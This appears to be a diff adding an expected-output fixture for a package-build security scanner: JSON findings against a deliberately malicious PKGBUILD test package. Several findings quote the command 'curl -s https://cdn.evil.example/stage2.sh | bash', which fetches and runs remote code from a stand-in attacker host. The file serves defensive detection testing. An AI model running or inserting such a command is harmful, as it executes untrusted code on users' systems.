@@ -1,0 +1,89 @@
+{
+  "package_name": "innocent-git",
+  "package_version": "r1-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/pkgver-func-payload/PKGBUILD",
+        "line": 9,
+        "column": 3,
+        "snippet": "  curl -s https://cdn.evil.example/stage2.sh | bash"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -s https://cdn.evil.example/stage2.sh | bash"
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://cdn.evil.example/stage2.sh",
+      "description": "This package downloads and executes code from https://cdn.evil.example/stage2.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/pkgver-func-payload/PKGBUILD",
+        "line": 9,
+        "column": null,
+        "snippet": "curl -s https://cdn.evil.example/stage2.sh | bash"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "flow": "fetch-pipe",
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://cdn.evil.example/stage2.sh"
+        ]
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'pkgver' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/pkgver-func-payload/PKGBUILD",
+        "line": 7,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "pkgver",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-007",
+      "severity": "low",
+      "category": "network_security",
+      "title": "VCS source not pinned to a commit",
+      "description": "Source #1 is a VCS checkout on a movable ref (branch/tag or none): git+https://github.com/alice/innocent.git. Its content is not integrity-pinned and can change between scan and build.",
+      "location": {
+        "file": "tests/fixtures/malicious/pkgver-func-payload/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "source=(\"git+https://github.com/alice/innocent.git\")"
+      },
+      "recommendation": "Pin the VCS source to an immutable revision with #commit=<sha>.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "fragment": null,
+        "url": "git+https://github.com/alice/innocent.git"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/pkgver-func-payload/PKGBUILD"
+  ],
+  "timestamp": "2026-11-10T14:51:05.804389198Z",
+  "scan_duration_ms": 17
+}
